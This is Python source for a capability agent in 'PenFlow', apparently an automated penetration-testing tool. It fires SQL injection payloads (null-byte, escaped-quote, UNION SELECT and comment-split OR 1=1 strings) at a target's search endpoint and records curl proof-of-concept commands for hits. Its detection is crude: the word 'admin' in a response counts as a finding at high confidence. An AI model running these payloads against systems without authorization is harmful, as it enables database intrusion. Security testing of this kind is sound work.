"""
PDO Prepared Statement SQL Injection Capability Agent for PenFlow.

Capabilities:
  - PDO Emulated-Prepare SQL Injection Bypasses (PortSwigger Top 10 2025 nomination)
  - Null Byte (\x00) & Escape Sequence Boundary Manipulation in Prepared Queries
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.pdo_sqli")

PDO_PAYLOADS = [
    "%00' OR '1'='1",
    "test%00' UNION SELECT 1,2,3--",
    "test\\' OR 1=1--",
    "test' /*comment*/ OR /*comment*/ '1'='1"
]


class PDOSQLiAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting SQL injection vulnerabilities in PHP PDO emulated prepared statements.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="PDOSQLiAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="pdo_sqli_vulnerability", name="PDO Prepared Statement SQLi", description="Detects SQL injection in PDO emulated prepared statements using null bytes and escape sequences", priority=self.priority, tags=["pdo", "sqli", "prepared_statement"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"
        target_url = f"{base_url}/api/v1/search"

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for payload in PDO_PAYLOADS:
                    test_url = f"{target_url}?q={payload}"
                    try:
                        resp = await client.get(test_url)
                        if resp.status_code == 200 and ("PDOException" in resp.text or "SQLSTATE" in resp.text or "admin" in resp.text.lower()):
                            curl_cmd = f"curl -i -s -k '{test_url}'"
                            exch_dict = {
                                "request": {"method": "GET", "url": test_url},
                                "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                            }

                            findings.append({
                                "vulnerability_type": "pdo_sqli_vulnerability",
                                "target_url": test_url,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("PDO Emulated Prepare SQLi", test_url, curl_cmd),
                                "description": f"PDO Emulated-Prepare SQL Injection confirmed at '{target_url}' via payload '{payload}'.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["pdo_sqli_success"] = True
                            break
                    except Exception as e:
                        logger.debug(f"PDO SQLi test failed on {test_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
